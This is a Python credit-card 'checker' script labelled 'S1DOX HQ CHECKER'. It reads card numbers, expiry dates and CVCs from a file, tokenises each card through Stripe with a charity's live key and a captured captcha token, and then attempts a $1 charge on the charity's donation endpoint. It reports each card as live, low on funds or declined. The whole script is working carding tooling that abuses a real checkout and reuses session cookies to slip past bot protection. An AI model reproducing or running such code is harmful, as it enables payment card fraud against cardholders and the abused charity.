import requests
import user_agent
import telebot,time
from user_agent import generate_user_agent
user_agent = generate_user_agent()
import pyfiglet
import os
import requests
import json
import time
import re
import pyfiglet
import colorama
from colorama import init, Fore, Style
file=open('cc.txt',"+r")
init()
color = Fore.BLUE
color1 = Fore.GREEN
color2 = Fore.RED
color3 = Fore.YELLOW
color4 = Fore.MAGENTA
color5 = Fore.CYAN
logo = pyfiglet.figlet_format('       Braintree 1$  ')
print(color5+logo)
k=("----+----+-----+------+-----+")
print(color1+k)
lo=("")
print(color3+lo)
i=("----+----+-----+------+-----+")
print(color5+i)
o=("ᯓ     S1DOX HQ  CHECKER ")
print(color5+o)
start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    mm=P.split('|')[1]
    yy=P.split('|')[2][-2:]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')
    time.sleep(5)
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

    data = f'type=card&billing_details[name]=Lalalal+Lalalal&billing_details[email]=athgdv%40hi2.in&billing_details[address][line1]=Jana&billing_details[address][line2]=Jana&billing_details[address][city]=Jana&billing_details[address][state]=Jana&billing_details[address][postal_code]=55414&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=bf93b5f4-8e77-402a-adb1-f608d324549cd581f0&muid=5a72bd97-57dc-4313-9596-96acadb65f56a2bd1d&sid=9cb0aa0b-eb4e-4369-819c-75afb997926fc3cc87&pasted_fields=number&payment_user_agent=stripe.js%2F792ca756f1%3B+stripe-js-v3%2F792ca756f1%3B+card-element&referrer=https%3A%2F%2Fgivinghand.charity&time_on_page=43181&key=pk_live_51Oo8yRK1XnH7l7ooUZvgdm1OY9mZ96hwxveVZrpiMi6kg0oPDzcwFfsTij3B2MAMLaNrJOcUbkfg5wJlglbhg34N00GvOmUclN&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiQ25nVGxvTlZmOUZIOUp0R1IvVFpMczFIYWNDd3p1QmhLVkgyOWJvZnp6K21VblMyMVBEN3hKRStLM1paZTNjN1VmcitlNmVJSVpET0NPVFdTazQxYlovR2FORGg2N2lJekRZVEpzcW94cUs4eitiYldqd2xBOWc3WFpBdHY2MTZrcmtWN05GaWFrV1BrbG5rSHB3c09LTCtlK0VVQkpiaTlrNGRwS001NThuRHU4NWY3NXpvS0Z5d1N5b3N0QTB4dm14QjFieTlISEhhQzg5UVFsL2dhY0c0eGN0a1pXQnVKZFRzQlduWGpyVjJDbUQ4TDBBdE1qcFk0bjhTaUYyT2Y2S3BtUUUvQmtQL1pHalZqcDBLbExpMVlJeW9nNCtQMnpTM2c1RUZ0dFU0KzZ5TDhZWnRjRmt2Y2F4d1creW9YbFB5ejM2UEFjWVhQWmVrOGcxSThoTEFYSXRRTkRrUDRHRUxIWmxwUGlrZXVnYVVKMjAxblhOMk9rekplVy9HeGJ6V1FIK1AyeUtkbjhuYThqQkNuOGdvSE5CdG5hOE5KMXp3d2Fva2hqTDd5aXBNcXpMekQyMUw1NW83cStMTnVuUzh2eklxK2V5eVZlcGNBeEFsVkZvcmVuM0VuNy9qR3J5WnNIVmdtdTB0dTRTVnNTQzljd0d0UFlSek9Bek5sSHd3LzRBdEdMU2JCT1VrZFhxUzRINjhlOFFvVmtGNTZMcWNlbmxEL0pFclNpRFk2ODJrZjJ3UzYzaTFKNG5BTVFGRE9JNVdUWlVLbU9wVVZKSXpFV3l4KzJSbStPa2JOT05kQUpQYUVCQ2pMY2ZoYmJqelBKcWd3YnVWWDVaSWFRUVBrVHlNQ2llVlpucUpZbHVRVllMTTRKMmhsSzlVTmU5U09QV2NaM1Q5QUZhbGo2cHFtdVd3c2JOMnQvcFVJMEYxajkyR2ZvK3B6eHNIYXlCMmpYdFBBM2xzbTMydzZsSFJpWDdHQ3k3RUpXZTZjOHpCd3Z6WEFzNldKaXh0YStCRytXdG9qcnBZM3VLVDJVZjRMMCs3bno0di9IRGhPRzlrZUFJV2phSVNWOWFFbHdRdjEyaGtsUE1PV3c3WkJ0MkdRU1RKUzZZeElEeXE1dDJTdkN0cG1kV1ZoRk12SkhiTm5oQVUrQnd6S1l4T3hQT0o5RHVGWEg5TWFzUW1IMElOUkRRcTVIU1hVeG1JT3NLSng4M0hkK2hjeEVmbW9CNXkvMHhLRG1HeFlWY1hUcGJzKzBoQnNYVm5FYTFlWlJBRlpPNGdVQjR2T1pnNjZlTUVpNDRudUtjNzNFU2puWGR6NHBKZGZaMzVRM1A3WExadllnWGxMS0REYVJaZ3Jjcndtbzc0Qkp4VDZ2OEZWWHhBOTJ2TnQrVUhqWFVkSllvWVVHalFZdUNvbkNQN0Fxd3pBc1JpMC9jNG1UUnI5dFltMnhaSWhRTkJMQVk2VUcwazZsUGxJdkhqZnRQUjEwRi9kelpYTitRSmlJb1NseTdWdDVoQUpLcDdaYlpHZHY4QWZDendyK0UzOGg0ZytkZmFZWTFqV2Q3WnNhTlJLZ0FZcXVBVHIyek1EaUQvZlo3bStxSW5DcDdYM0czUDVxTHNlbXdoeTQ2cTIwZWl3enE5Q0MxVFNjSXc4ZUIwS2hGUHNJQVJaalVkNFR6TVp5QU4yb2M5by8vY01GdzNmZk14Y1ZBMlMrd0dYdzJpSU9MRTBIVjhWeTB2eHNBanNQZTlaNVNmVGlHeEJzdVFwbnU1eXtacTlySkNpbldyQ0JyMWp4TEJTV3krdHd3SVAxMDdKV3JDZzF4SlN6MmpaQ01TN09pUjIzVExFQllpWTR1QStLb0J4YThMMHhvcjR1blhtWkluSGlpSTZoVXJIKzFDZDNUaGJlbVNxTy9taVZuc1gxa2N5WlppdU04ZDlCdHVEbUVhR0s3NGNsUzJMUU92ejNnVG9vbXVxT3VQS3lIbkowMEkzeWRCanNGMDE2V2FEVlFBeno1YXoxbGszd3ZUUzNqK1RmaGQ0eFRhOGdPN2t4NVl4L1RKRnZHYldVZ2Y3WjlXczFHSmlrL0owUVU0ekVZZy9jTkR3eVN3Z3VVQldqaVhoazlmR21JUUNwUDhzQStUcUhrZ2dOQ0R5YXM1UmJOUEczZjd6S21JYnBWRS8yQ29rMWpNa0p4dGcvNXRETjlJTU5Mc21oYmJKMUxtUUY4WXYvRjNJQ3RRcjFaMlF2d0ZGcDl6dERBNC9oVkdPNy9iOGk1MVpST3pQSTdGcXozZjZ6dDQwTjJLQWRKTUdncW83MVhOSE1nblhzT2JVOU9IUXV6SnZzcGpPbGNiYUNDS3dGTVFETnI2THN1em92alNPQmJ3anRuK0pzdGpJZTVIaGpieTdGUGxNeW1hVnoyR3J1SmdIbUw1OGYzTlhSa1IyWTgrempCTjFic1NxRjJaK2RqaURaSWNtaFZYZk1yUUFGbkVoeHhuTG4yL01oYWFTQVVUVWFvdGdCb3huRDFESXhzbXF4QktoalN6OHlXQjVkTjhXMXZpUlFkc3hhRGduZ2dwZkhESmVLNEt1ekhod3d2ZHBKYUtlVGU5Q3BNcWVESFhsR1VJOUo1cksrVCswZ2NQWjd3NW1IV1c0TWpHNXhyeUVFYlFFc201cWwrTEJhU2c3UlJGeWpJT3lxRURKTklPVjZwZFJoa2FxdTA5VHN5SmUvUW1ndHVydXJKYzJFTzBKeGw2SEU5VVJGYStSckd4NGhqUVJUNGdGOE1XT0dnVXFiSlJVVkFBb0hkbmgwZzVYa2IwdXg3ajAxTWdSN05zb1RoZ0RIZS9wSEt0d1EyblhMMVEiLCJleHAiOjE3MjM5ODYwMTAsInNoYXJkX2lkIjoyNTkxODkzNTksImtyIjoiNGFlYzEzIiwicGQiOjAsImNkYXRhIjoiSjduS3FpclhiR1NleFRua1lWc0U5VUFHeUVZQVFSWE1WdFducmNBa3d3eG1PYW50WGZRUEh6QUhDTitMdTVmc29QV1lHaWVtQWJBTXk4dGdmZVpsalVuMUxDL0ppTzZoMXFBWEFJVHF0RTBFdUc5MklQLy9Jd1cxOWoxa2ZnakpJMjhFWjAxSlRjWG9ucVdCMTRNMTdJcC9iUFBsdFVFZmxVeGFLa1BSL2U5L1M1aFI2cDBIdmFyUHdyZWdUd3RsZUNnL0UrdmlxVG1PR3A3cyJ9.twXxpC0Z_3KX_GvDon6YPn216UpW7FXliaMlebioQXo'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    id=(response.json()['id'])
    cookies = {
    'i3CURRENCY=GBP; i3CID=1fd95068-3100-4651-9cbd-d05048da67f2; cookie_notice_accepted=true; __stripe_mid=a818cb68-a1b8-4e7f-9fcf-d3b42b611baf28cfc0; __stripe_sid=c252d663-3548-4f5d-a706-3f4a29e42a29a4ec7c; i3d-statement=1fd95068-3100-4651-9cbd-d05048da67f2; pillar-activity=8176; cf_clearance=PaxeOkHbB0lhP6xkRPfRvQJXYCZUN7ozmpXyRFl7WUE-1747432465-1.2.1.1-UMeESQ6CyMgVhaYPsVCWek86Q7OKvb.0KoeQoEWWxaMV2QIXw6y1B.PMyqppIZ0HFGdJec.Gdzbt5QGDKrGr4maAmNjagQpQS_kVr7Hl8UdoS6O1Y2YKrTQHYeuRL4W4nl6J_8WcGSXCz3E8F78PVoDleaEVVGq4q3x0Eqk8d0.R0RSdG7bllGI4.6dfBUV73giYX8x.Ra0IDHF2r2aGXhYG7Ad8XCqzqLxi7f0Dz4o2AnwJwMWQ9Eb.8Prz3Uf5crihtHSJZygGCFrWnlKkSdlGB88uhUG5nFHJEQf.CshAiOSPbYQl_wq8_MQYkwDeAbNbroLiHcpJvl9voLb_8m0U3Xs27rPl2GdLVBB26zI',
 # Added a placeholder __cf_bm cookie
}

    headers = {
    'authority': 'givinghand.charity',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'i3CURRENCY=GBP; i3CID=1fd95068-3100-4651-9cbd-d05048da67f2; cookie_notice_accepted=true; __stripe_mid=a818cb68-a1b8-4e7f-9fcf-d3b42b611baf28cfc0; __stripe_sid=c252d663-3548-4f5d-a706-3f4a29e42a29a4ec7c; i3d-statement=1fd95068-3100-4651-9cbd-d05048da67f2; pillar-activity=8176; cf_clearance=PaxeOkHbB0lhP6xkRPfRvQJXYCZUN7ozmpXyRFl7WUE-1747432465-1.2.1.1-UMeESQ6CyMgVhaYPsVCWek86Q7OKvb.0KoeQoEWWxaMV2QIXw6y1B.PMyqppIZ0HFGdJec.Gdzbt5QGDKrGr4maAmNjagQpQS_kVr7Hl8UdoS6O1Y2YKrTQHYeuRL4W4nl6J_8WcGSXCz3E8F78PVoDleaEVVGq4q3x0Eqk8d0.R0RSdG7bllGI4.6dfBUV73giYX8x.Ra0IDHF2r2aGXhYG7Ad8XCqzqLxi7f0Dz4o2AnwJwMWQ9Eb.8Prz3Uf5crihtHSJZygGCFrWnlKkSdlGB88uhUG5nFHJEQf.CshAiOSPbYQl_wq8_MQYkwDeAbNbroLiHcpJvl9voLb_8m0U3Xs27rPl2GdLVBB26zI', # Original cookie header commented out
    'origin': 'https://givinghand.charity',
    'referer': 'https://givinghand.charity/checkout/payment-processing/?statement_id=1fd95068-3100-4651-9cbd-d05048da67f2&gateway=stripe_intent',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'action': 'get_single_intent',
    'payment_method_id': id,
    'statement_id': '1fd95068-3100-4651-9cbd-d05048da67f2',
}

    response = requests.post('https://givinghand.charity/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
    # Check if 'error' key exists before accessing 'message'
    if 'error' in response.json():
        msg=(response.json()['error']['message'])
        if "card has insufficient funds" in msg:
        	print(color1+f'[ {start_num} ]',P,' ➜  LOW FUNDS✅')
        elif "Your card's security code is incorrect." in msg or "Your card's security code is invalid." in msg:
        	print(color1+f'[ {start_num} ]',P,' ➜ CCN ✅')
        elif "Your card number is incorrect" in msg or "Your card was declined" in msg:
        	print(color2+f'[ {start_num} ]',P,' ➜ Generic Decline ❌ ')
        else:
        		print(color1+f'[ {start_num} ]',P,' ➜ CHARGE FULL 1$ ✅')
    else:
        # Handle cases where there is no 'error' key, potentially a successful charge or different response structure
        print(color1+f'[ {start_num} ]',P,' ➜ CHARGE FULL 1$ ✅ (No error message)')

# The file is automatically closed when the script finishes or if an exception occurs outside the loop.
# If you need explicit closing, you could use a try...finally block or 'with open(...)'.
# Since the original code didn't explicitly close, we maintain that behavior.